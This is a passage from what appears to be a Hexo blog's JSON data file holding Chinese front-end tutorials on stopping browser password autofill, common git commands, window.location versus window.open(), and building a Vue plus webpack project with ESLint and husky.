class=\"headerlink\" title=\"详述\"></a>详述</h1><p>email登录页自动填充，体验是没有问题的，如图：<br><img src=\"/2019-03-05-禁止浏览器自动填充账号密码/1.jpg\" alt=\"email+password\"></p>\n<p>但是切换到phone登录页自动填充，体验就不好了，phone输入框自动填上了email，如图：<br><img src=\"/2019-03-05-禁止浏览器自动填充账号密码/2.jpg\" alt=\"phone+password\"></p>\n<p>对于这种情况怎么处理呢，最简单的方式就是禁用自动填充，如图：<br><img src=\"/2019-03-05-禁止浏览器自动填充账号密码/3.jpg\" alt=\"phone+password\"></p>\n<p>但是对于chrome浏览器，当你授权记住登录密码的，这种有登录密码的页面，直接加<code>autocomplete=&quot;off&quot;</code>是无效的，浏览器还是会强行填充账号密码。</p>\n<p>怎么处理呢？</p>\n<p>在password元素上加<code>autocomplete=&quot;new-password&quot;</code>就可以了。<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;input placeholder=<span class=\"string\">\"Password\"</span> type=<span class=\"string\">\"password\"</span> name=<span class=\"string\">\"password\"</span> tabindex=<span class=\"string\">\"2\"</span> autocomplete=<span class=\"string\">\"new-password\"</span>&gt;</span><br></pre></td></tr></table></figure></p>\n<h1 id=\"后记\"><a href=\"#后记\" class=\"headerlink\" title=\"后记\"></a>后记</h1><p>以上处理方式也只是简单的优化下体验，对于各种浏览器，可能各家对于允许记住密码的自动填充策略各不相同，因此如果觉得只需要体验改善，没必要下大功夫处理的，这样就好了。如果非得处理，也可以再加个隐藏的password元素给自动配对，而显示另一个，或者用js处理等方式。</p>\n","site":{"data":{}},"excerpt":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>对于禁用表单自动填充，HTML5标准语法是在form或者input元素上加<code>autocomplete=&quot;off&quot;</code>，实践发现有些兼容问题。</p>\n<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><p>一般来讲对于浏览器自动填充表单的账号密码是不需要处理的，但是当登录可以用email+password或者phone+password就得处理了，实践发现用email注册登录后，下次再phone登录页面会自动填充email账号。<br></p>","more":"<p></p>\n<h1 id=\"详述\"><a href=\"#详述\" class=\"headerlink\" title=\"详述\"></a>详述</h1><p>email登录页自动填充，体验是没有问题的，如图：<br><img src=\"/2019-03-05-禁止浏览器自动填充账号密码/1.jpg\" alt=\"email+password\"></p>\n<p>但是切换到phone登录页自动填充，体验就不好了，phone输入框自动填上了email，如图：<br><img src=\"/2019-03-05-禁止浏览器自动填充账号密码/2.jpg\" alt=\"phone+password\"></p>\n<p>对于这种情况怎么处理呢，最简单的方式就是禁用自动填充，如图：<br><img src=\"/2019-03-05-禁止浏览器自动填充账号密码/3.jpg\" alt=\"phone+password\"></p>\n<p>但是对于chrome浏览器，当你授权记住登录密码的，这种有登录密码的页面，直接加<code>autocomplete=&quot;off&quot;</code>是无效的，浏览器还是会强行填充账号密码。</p>\n<p>怎么处理呢？</p>\n<p>在password元素上加<code>autocomplete=&quot;new-password&quot;</code>就可以了。<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;input placeholder=<span class=\"string\">\"Password\"</span> type=<span class=\"string\">\"password\"</span> name=<span class=\"string\">\"password\"</span> tabindex=<span class=\"string\">\"2\"</span> autocomplete=<span class=\"string\">\"new-password\"</span>&gt;</span><br></pre></td></tr></table></figure></p>\n<h1 id=\"后记\"><a href=\"#后记\" class=\"headerlink\" title=\"后记\"></a>后记</h1><p>以上处理方式也只是简单的优化下体验，对于各种浏览器，可能各家对于允许记住密码的自动填充策略各不相同，因此如果觉得只需要体验改善，没必要下大功夫处理的，这样就好了。如果非得处理，也可以再加个隐藏的password元素给自动配对，而显示另一个，或者用js处理等方式。</p>"},{"title":"git常用命令","date":"2019-02-11T14:48:28.000Z","updated":"2019-02-11T14:48:28.000Z","_content":"\n# 概述\n```bash\ngit remote add origin git@github.com:yourName/yourRepo.git\ngit pull origin master\ngit add .\ngit commit -m \"first commit\" \ngit push origin master  \n```\n<!-- more -->\n# 详述\n\n## 查看远程仓库\n```bash\ngit remote -v\n```\n## 删除远程仓库\n```bash\ngit remote rm [remote_name]\ngit remote rm origin\n```\n## 添加远程仓库\n```bash\ngit remote add [remote_name] git@github.com:yourName/yourRepo.git\ngit remote add origin git@github.com:jovysun/pipeImg.git\n```\n## 查看分支\n```bash\ngit branch -a\n```\n## 回退到上个版本\n```bash\ngit reset --hard HEAD^\n```\n#查看所有分支\n```bash\ngit branch -a\n```\n#切到dev分支\n```bash\ngit checkout dev\n```\n#切回master\n```bash\ngit checkout master\n```","source":"_posts/2019/02/2019-02-11-git常用命令.md","raw":"---\ntitle: git常用命令\ntags:\n  - git\n  - 工具\ncategories:\n  - 前端\ndate: 2019-02-11 22:48:28\nupdated: 2019-02-11 22:48:28\n---\n\n# 概述\n```bash\ngit remote add origin git@github.com:yourName/yourRepo.git\ngit pull origin master\ngit add .\ngit commit -m \"first commit\" \ngit push origin master  \n```\n<!-- more -->\n# 详述\n\n## 查看远程仓库\n```bash\ngit remote -v\n```\n## 删除远程仓库\n```bash\ngit remote rm [remote_name]\ngit remote rm origin\n```\n## 添加远程仓库\n```bash\ngit remote add [remote_name] git@github.com:yourName/yourRepo.git\ngit remote add origin git@github.com:jovysun/pipeImg.git\n```\n## 查看分支\n```bash\ngit branch -a\n```\n## 回退到上个版本\n```bash\ngit reset --hard HEAD^\n```\n#查看所有分支\n```bash\ngit branch -a\n```\n#切到dev分支\n```bash\ngit checkout dev\n```\n#切回master\n```bash\ngit checkout master\n```","slug":"2019-02-11-git常用命令","published":1,"comments":1,"layout":"post","photos":[],"link":"","_id":"ck0m3d8x60050wovvdu0ccam2","content":"<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git remote add origin git@github.com:yourName/yourRepo.git</span><br><span class=\"line\">git pull origin master</span><br><span class=\"line\">git add .</span><br><span class=\"line\">git commit -m <span class=\"string\">\"first commit\"</span> </span><br><span class=\"line\">git push origin master</span><br></pre></td></tr></table></figure>\n<a id=\"more\"></a>\n<h1 id=\"详述\"><a href=\"#详述\" class=\"headerlink\" title=\"详述\"></a>详述</h1><h2 id=\"查看远程仓库\"><a href=\"#查看远程仓库\" class=\"headerlink\" title=\"查看远程仓库\"></a>查看远程仓库</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git remote -v</span><br></pre></td></tr></table></figure>\n<h2 id=\"删除远程仓库\"><a href=\"#删除远程仓库\" class=\"headerlink\" title=\"删除远程仓库\"></a>删除远程仓库</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git remote rm [remote_name]</span><br><span class=\"line\">git remote rm origin</span><br></pre></td></tr></table></figure>\n<h2 id=\"添加远程仓库\"><a href=\"#添加远程仓库\" class=\"headerlink\" title=\"添加远程仓库\"></a>添加远程仓库</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git remote add [remote_name] git@github.com:yourName/yourRepo.git</span><br><span class=\"line\">git remote add origin git@github.com:jovysun/pipeImg.git</span><br></pre></td></tr></table></figure>\n<h2 id=\"查看分支\"><a href=\"#查看分支\" class=\"headerlink\" title=\"查看分支\"></a>查看分支</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git branch -a</span><br></pre></td></tr></table></figure>\n<h2 id=\"回退到上个版本\"><a href=\"#回退到上个版本\" class=\"headerlink\" title=\"回退到上个版本\"></a>回退到上个版本</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git reset --hard HEAD^</span><br></pre></td></tr></table></figure>\n<p>#查看所有分支<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git branch -a</span><br></pre></td></tr></table></figure></p>\n<p>#切到dev分支<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git checkout dev</span><br></pre></td></tr></table></figure></p>\n<p>#切回master<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git checkout master</span><br></pre></td></tr></table></figure></p>\n","site":{"data":{}},"excerpt":"<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git remote add origin git@github.com:yourName/yourRepo.git</span><br><span class=\"line\">git pull origin master</span><br><span class=\"line\">git add .</span><br><span class=\"line\">git commit -m <span class=\"string\">\"first commit\"</span> </span><br><span class=\"line\">git push origin master</span><br></pre></td></tr></table></figure>","more":"<h1 id=\"详述\"><a href=\"#详述\" class=\"headerlink\" title=\"详述\"></a>详述</h1><h2 id=\"查看远程仓库\"><a href=\"#查看远程仓库\" class=\"headerlink\" title=\"查看远程仓库\"></a>查看远程仓库</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git remote -v</span><br></pre></td></tr></table></figure>\n<h2 id=\"删除远程仓库\"><a href=\"#删除远程仓库\" class=\"headerlink\" title=\"删除远程仓库\"></a>删除远程仓库</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git remote rm [remote_name]</span><br><span class=\"line\">git remote rm origin</span><br></pre></td></tr></table></figure>\n<h2 id=\"添加远程仓库\"><a href=\"#添加远程仓库\" class=\"headerlink\" title=\"添加远程仓库\"></a>添加远程仓库</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git remote add [remote_name] git@github.com:yourName/yourRepo.git</span><br><span class=\"line\">git remote add origin git@github.com:jovysun/pipeImg.git</span><br></pre></td></tr></table></figure>\n<h2 id=\"查看分支\"><a href=\"#查看分支\" class=\"headerlink\" title=\"查看分支\"></a>查看分支</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git branch -a</span><br></pre></td></tr></table></figure>\n<h2 id=\"回退到上个版本\"><a href=\"#回退到上个版本\" class=\"headerlink\" title=\"回退到上个版本\"></a>回退到上个版本</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git reset --hard HEAD^</span><br></pre></td></tr></table></figure>\n<p>#查看所有分支<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git branch -a</span><br></pre></td></tr></table></figure></p>\n<p>#切到dev分支<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git checkout dev</span><br></pre></td></tr></table></figure></p>\n<p>#切回master<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git checkout master</span><br></pre></td></tr></table></figure></p>"},{"title":"window.location与window.open()","date":"2019-02-15T06:20:19.000Z","updated":"2019-02-15T06:20:19.000Z","_content":"\n# 概述\n只对两者打开页面的常用场景作个总结，至于详细知识点可以看[JavaScript 高级程序设计 第 8 章](/2019/01/10/JS高设3版-8/)。\n<!-- more -->\n\n# 详述\n\n## 基本用法\n\n```js\nwindow.location.href = \"//www.sogou.com\";\nwindow.open(\"//www.sogou.com\");\n```\n\n前者是在当前窗口打开页面，浏览器历史记录中会生成一条记录，因此可以“后退”到前一个页面。\n后者是在新的窗口打开页面，有些浏览器默认会拦截，如图：\n![图一](1.gif)\n\n## 其他常用\n\n```js\nparent.location.href = \"//www.sogou.com\";\ntop.location.href = \"//www.sogou.com\";\n// 当前窗口打开\nwindow.open(\"//www.sogou.com\", \"_self\");\nwindow.open(\"//www.sogou.com\", \"_top\");\n```\n\n## window.open()屏蔽检测\n\n```js\nvar blocked = false;\ntry {\n  var wroxWin = window.open(\"//www.sogou.com\");\n  if (wroxWin == null) {\n    blocked = true;\n  }\n} catch (ex) {\n  blocked = true;\n}\nif (blocked) {\n  alert(\"The popup was blocked!\");\n}\n```\n\n# 后记\n","source":"_posts/2019/02/2019-02-15-window-location与window-open.md","raw":"---\ntitle: window.location与window.open()\ntags:\n  - JavaScript\ncategories:\n  - 前端\ndate: 2019-02-15 14:20:19\nupdated: 2019-02-15 14:20:19\n---\n\n# 概述\n只对两者打开页面的常用场景作个总结，至于详细知识点可以看[JavaScript 高级程序设计 第 8 章](/2019/01/10/JS高设3版-8/)。\n<!-- more -->\n\n# 详述\n\n## 基本用法\n\n```js\nwindow.location.href = \"//www.sogou.com\";\nwindow.open(\"//www.sogou.com\");\n```\n\n前者是在当前窗口打开页面，浏览器历史记录中会生成一条记录，因此可以“后退”到前一个页面。\n后者是在新的窗口打开页面，有些浏览器默认会拦截，如图：\n![图一](1.gif)\n\n## 其他常用\n\n```js\nparent.location.href = \"//www.sogou.com\";\ntop.location.href = \"//www.sogou.com\";\n// 当前窗口打开\nwindow.open(\"//www.sogou.com\", \"_self\");\nwindow.open(\"//www.sogou.com\", \"_top\");\n```\n\n## window.open()屏蔽检测\n\n```js\nvar blocked = false;\ntry {\n  var wroxWin = window.open(\"//www.sogou.com\");\n  if (wroxWin == null) {\n    blocked = true;\n  }\n} catch (ex) {\n  blocked = true;\n}\nif (blocked) {\n  alert(\"The popup was blocked!\");\n}\n```\n\n# 后记\n","slug":"2019-02-15-window-location与window-open","published":1,"comments":1,"layout":"post","photos":[],"link":"","_id":"ck0m3d8x70053wovvtnx0frr8","content":"<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><p>只对两者打开页面的常用场景作个总结，至于详细知识点可以看<a href=\"/2019/01/10/JS高设3版-8/\">JavaScript 高级程序设计 第 8 章</a>。<br><a id=\"more\"></a></p>\n<h1 id=\"详述\"><a href=\"#详述\" class=\"headerlink\" title=\"详述\"></a>详述</h1><h2 id=\"基本用法\"><a href=\"#基本用法\" class=\"headerlink\" title=\"基本用法\"></a>基本用法</h2><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">window</span>.location.href = <span class=\"string\">\"//www.sogou.com\"</span>;</span><br><span class=\"line\"><span class=\"built_in\">window</span>.open(<span class=\"string\">\"//www.sogou.com\"</span>);</span><br></pre></td></tr></table></figure>\n<p>前者是在当前窗口打开页面，浏览器历史记录中会生成一条记录，因此可以“后退”到前一个页面。<br>后者是在新的窗口打开页面，有些浏览器默认会拦截，如图：<br><img src=\"/2019-02-15-window-location与window-open/1.gif\" alt=\"图一\"></p>\n<h2 id=\"其他常用\"><a href=\"#其他常用\" class=\"headerlink\" title=\"其他常用\"></a>其他常用</h2><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">parent.location.href = <span class=\"string\">\"//www.sogou.com\"</span>;</span><br><span class=\"line\">top.location.href = <span class=\"string\">\"//www.sogou.com\"</span>;</span><br><span class=\"line\"><span class=\"comment\">// 当前窗口打开</span></span><br><span class=\"line\"><span class=\"built_in\">window</span>.open(<span class=\"string\">\"//www.sogou.com\"</span>, <span class=\"string\">\"_self\"</span>);</span><br><span class=\"line\"><span class=\"built_in\">window</span>.open(<span class=\"string\">\"//www.sogou.com\"</span>, <span class=\"string\">\"_top\"</span>);</span><br></pre></td></tr></table></figure>\n<h2 id=\"window-open-屏蔽检测\"><a href=\"#window-open-屏蔽检测\" class=\"headerlink\" title=\"window.open()屏蔽检测\"></a>window.open()屏蔽检测</h2><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> blocked = <span class=\"literal\">false</span>;</span><br><span class=\"line\"><span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> wroxWin = <span class=\"built_in\">window</span>.open(<span class=\"string\">\"//www.sogou.com\"</span>);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (wroxWin == <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">    blocked = <span class=\"literal\">true</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125; <span class=\"keyword\">catch</span> (ex) &#123;</span><br><span class=\"line\">  blocked = <span class=\"literal\">true</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">if</span> (blocked) &#123;</span><br><span class=\"line\">  alert(<span class=\"string\">\"The popup was blocked!\"</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h1 id=\"后记\"><a href=\"#后记\" class=\"headerlink\" title=\"后记\"></a>后记</h1>","site":{"data":{}},"excerpt":"<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><p>只对两者打开页面的常用场景作个总结，至于详细知识点可以看<a href=\"/2019/01/10/JS高设3版-8/\">JavaScript 高级程序设计 第 8 章</a>。<br></p>","more":"<p></p>\n<h1 id=\"详述\"><a href=\"#详述\" class=\"headerlink\" title=\"详述\"></a>详述</h1><h2 id=\"基本用法\"><a href=\"#基本用法\" class=\"headerlink\" title=\"基本用法\"></a>基本用法</h2><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">window</span>.location.href = <span class=\"string\">\"//www.sogou.com\"</span>;</span><br><span class=\"line\"><span class=\"built_in\">window</span>.open(<span class=\"string\">\"//www.sogou.com\"</span>);</span><br></pre></td></tr></table></figure>\n<p>前者是在当前窗口打开页面，浏览器历史记录中会生成一条记录，因此可以“后退”到前一个页面。<br>后者是在新的窗口打开页面，有些浏览器默认会拦截，如图：<br><img src=\"/2019-02-15-window-location与window-open/1.gif\" alt=\"图一\"></p>\n<h2 id=\"其他常用\"><a href=\"#其他常用\" class=\"headerlink\" title=\"其他常用\"></a>其他常用</h2><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">parent.location.href = <span class=\"string\">\"//www.sogou.com\"</span>;</span><br><span class=\"line\">top.location.href = <span class=\"string\">\"//www.sogou.com\"</span>;</span><br><span class=\"line\"><span class=\"comment\">// 当前窗口打开</span></span><br><span class=\"line\"><span class=\"built_in\">window</span>.open(<span class=\"string\">\"//www.sogou.com\"</span>, <span class=\"string\">\"_self\"</span>);</span><br><span class=\"line\"><span class=\"built_in\">window</span>.open(<span class=\"string\">\"//www.sogou.com\"</span>, <span class=\"string\">\"_top\"</span>);</span><br></pre></td></tr></table></figure>\n<h2 id=\"window-open-屏蔽检测\"><a href=\"#window-open-屏蔽检测\" class=\"headerlink\" title=\"window.open()屏蔽检测\"></a>window.open()屏蔽检测</h2><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> blocked = <span class=\"literal\">false</span>;</span><br><span class=\"line\"><span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> wroxWin = <span class=\"built_in\">window</span>.open(<span class=\"string\">\"//www.sogou.com\"</span>);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (wroxWin == <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">    blocked = <span class=\"literal\">true</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125; <span class=\"keyword\">catch</span> (ex) &#123;</span><br><span class=\"line\">  blocked = <span class=\"literal\">true</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">if</span> (blocked) &#123;</span><br><span class=\"line\">  alert(<span class=\"string\">\"The popup was blocked!\"</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h1 id=\"后记\"><a href=\"#后记\" class=\"headerlink\" title=\"后记\"></a>后记</h1>"},{"title":"从0搭建vue+webpack工程工作流","date":"2019-04-04T04:30:20.000Z","updated":"2019-04-04T04:30:20.000Z","_content":"\n# 概述\n从实际出发，手动从零搭建一个vue开发工程。从基本依赖到工程工具到代码规范到生产打包，从不同功能层面逐步安装，并作对应说明。技术栈：vue2.x+webpack4.x+babel7.x。[完整代码](https://github.com/jovysun/vue-webpack-project)\n\n<!-- more -->\n\n# 详述\n## 初始化\n```shell\nnpm init\n```\n\n## 安装\n\n### 基本环境\n```shell\nnpm i vue vue-router vuex -S\n```\n```shell\nnpm i webpack webpack-cli vue-loader css-loader vue-style-loader vue-template-compiler -D\n```\n### 静态资源\n```shell\nnpm i url-loader file-loader -D\n```\n### scss预编译\n```shell\nnpm i sass-loader node-sass -D\n```\n### 开发server\n```shell\nnpm i webpack-dev-server html-webpack-plugin -D\n```\n### postcss\n```shell\nnpm i postcss-loader autoprefixer -D\n```\n\n### Babel 7.x\n```shell\n# 基本配置\nnpm i @babel/core @babel/preset-env @babel/polyfill @babel/runtime @babel/plugin-transform-runtime @babel/runtime-corejs2 -D\n# .vue开发环境\nnpm i babel-plugin-transform-vue-jsx babel-helper-vue-jsx-merge-props babel-plugin-syntax-jsx babel-plugin-dynamic-import-webpack -D\n# webpack环境的loader\nnpm i babel-loader -D\n```\n\n### css分离\n```shell\nnpm i mini-css-extract-plugin -D\n```\n### 跨平台设置环境参数与删除文件工具\n```shell\nnpm i cross-env rimraf -D\n```\n### 前端gzip压缩\n```shell\nnpm i compression-webpack-plugin -D\n```\n\n\n## 代码规范\n\n### ESlint\n#### `.js`检测\n```shell\nnpm i eslint eslint-config-standard eslint-plugin-standard eslint-plugin-promise eslint-plugin-import eslint-plugin-node -D\n```\n#### `.vue`检测\n```shell\nnpm i eslint-plugin-vue -D\n```\n#### 根目录下创建`.eslintrc`文件，配置如下：\n```json\n{\n  \"extends\": [\n    \"standard\",\n    \"plugin:vue/recommended\"\n  ],\n  \"parserOptions\": {\n    \"parser\": \"babel-eslint\",\n    \"sourceType\": \"module\"\n  }\n}\n```\n#### `package.json`中添加执行检测命令和检测并自动修复命令\n```json\n\"scripts\": {\n  \"lint\": \"eslint --ext .js --ext .jsx --ext .vue src/\",\n  \"lint\": \"eslint --fix --ext .js --ext .jsx --ext .vue src/\"\n}\n```\n#### 编码时检测\n`babel-eslint`用途是我们代码都是经过babel编译的，有些语法不是标准的eslint规范，因此需要指定parser为`babel-eslint`。\n```shell\nnpm i eslint-loader babel-eslint -D\n```\n`.eslintrc`文件修改如下\n```json\n{\n  \"extends\": [\n    \"standard\",\n    \"plugin:vue/recommended\"\n  ],\n  \"parserOptions\": {\n    \"parser\": \"babel-eslint\",\n    \"sourceType\": \"module\"\n  }\n}\n```\n配置`eslint-loader`\n```js\nrules: [\n  {\n    test: /\\.(vue|js|jsx)$/,\n    loader: 'eslint-loader',\n    exclude: /node_modules/,\n    enforce: 'pre' //预处理，在其他loader（如vue-loader）处理前先处理\n  }\n]\n```\n#### 忽略指定文件，例如忽略dist文件夹\n创建`.eslintignore`，配置如下\n```\ndist\n```\n\n### EditorConfig\n编辑器插件，让不同编辑器下编写代码用相同的规则处理。\n\n根目录创建`.editorconfig`文件，配置如下：\n```\nroot = true\n\n[*]\ncharset = utf-8\nend_of_line = 1f\nindent_size = 2\nindent_style = space\ninsert_final_newline = true\ntrim_trailing_whitespace = true\n```\n\n### precommit\ngit提交前进行eslint检测，保证不合规范的代码无法提交到远程库。注意，这是针对git提交，因此我们要先保证目录下已经完成git初始化（git init），会在.git文件夹下的hooks目录下生成各种文件。关于git钩子插件的更多介绍可以看[这里](https://www.jianshu.com/p/f0d31f92bfab)。\n\n```shell\nnpm i husky -D\n```\n`package.json`修改为：\n```json\n\"scripts\": {\n  \"lint\": \"eslint --ext .js --ext .jsx --ext .vue src/\",\n  \"lint-fix\": \"eslint --fix --ext .js --ext .jsx --ext .vue src/\",\n  \"precommit\": \"npm run lint-fix\"\n}\n```\n\n# 后记","source":"_posts/2019/04/2019-04-04-vue-webpack-project.md","raw":"---\ntitle: 从0搭建vue+webpack工程工作流\ntags:\n  - Vue\n  - webpack\ncategories:\n  - 前端\ndate: 2019-04-04 12:30:20\nupdated: 2019-04-04 12:30:20\n---\n\n# 概述\n从实际出发，手动从零搭建一个vue开发工程。从基本依赖到工程工具到代码规范到生产打包，从不同功能层面逐步安装，并作对应说明。技术栈：vue2.x+webpack4.x+babel7.x。[完整代码](https://github.com/jovysun/vue-webpack-project)\n\n<!-- more -->\n\n# 详述\n## 初始化\n```shell\nnpm init\n```\n\n## 安装\n\n### 基本环境\n```shell\nnpm i vue vue-router vuex -S\n```\n```shell\nnpm i webpack webpack-cli vue-loader css-loader vue-style-loader vue-template-compiler -D\n```\n### 静态资源\n```shell\nnpm i url-loader file-loader -D\n```\n### scss预编译\n```shell\nnpm i sass-loader node-sass -D\n```\n### 开发server\n```shell\nnpm i webpack-dev-server html-webpack-plugin -D\n```\n### postcss\n```shell\nnpm i postcss-loader autoprefixer -D\n```\n\n### Babel 7.x\n```shell\n# 基本配置\nnpm i @babel/core @babel/preset-env @babel/polyfill @babel/runtime @babel/plugin-transform-runtime @babel/runtime-corejs2 -D\n# .vue开发环境\nnpm i babel-plugin-transform-vue-jsx babel-helper-vue-jsx-merge-props babel-plugin-syntax-jsx babel-plugin-dynamic-import-webpack -D\n# webpack环境的loader\nnpm i babel-loader -D\n```\n\n### css分离\n```shell\nnpm i mini-css-extract-plugin -D\n```\n### 跨平台设置环境参数与删除文件工具\n```shell\nnpm i cross-env rimraf -D\n```\n### 前端gzip压缩\n```shell\nnpm i compression-webpack-plugin -D\n```\n\n\n## 代码规范\n\n### ESlint\n#### `.js`检测\n```shell\nnpm i eslint eslint-config-standard eslint-plugin-standard eslint-plugin-promise eslint-plugin-import eslint-plugin-node -D\n```\n#### `.vue`检测\n```shell\nnpm i eslint-plugin-vue -D\n```\n#### 根目录下创建`.eslintrc`文件，配置如下：\n```json\n{\n  \"extends\": [\n    \"standard\",\n    \"plugin:vue/recommended\"\n  ],\n  \"parserOptions\": {\n    \"parser\": \"babel-eslint\",\n    \"sourceType\": \"module\"\n  }\n}\n```\n#### `package.json`中添加执行检测命令和检测并自动修复命令\n```json\n\"scripts\": {\n  \"lint\": \"eslint --ext .js --ext .jsx --ext .vue src/\",\n  \"lint\": \"eslint --fix --ext .js --ext .jsx --ext .vue src/\"\n}\n```\n#### 编码时检测\n`babel-eslint`用途是我们代码都是经过babel编译的，有些语法不是标准的eslint规范，因此需要指定parser为`babel-eslint`。\n```shell\nnpm i eslint-loader babel-eslint -D\n```\n`.eslintrc`文件修改如下\n```json\n{\n  \"extends\": [\n    \"standard\",\n    \"plugin:vue/recommended\"\n  ],\n  \"parserOptions\": {\n    \"parser\": \"babel-eslint\",\n    \"sourceType\": \"module\"\n  }\n}\n```\n配置`eslint-loader`\n```js\nrules: [\n  {\n    test: /\\.(vue|js|jsx)$/,\n    loader: 'eslint-loader',\n    exclude: /node_modules/,\n    enforce: 'pre' //预处理，在其他loader（如vue-loader）处理前先处理\n  }\n]\n```\n#### 忽略指定文件，例如忽略dist文件夹\n创建`.eslintignore`，配置如下\n```\ndist\n```\n\n### 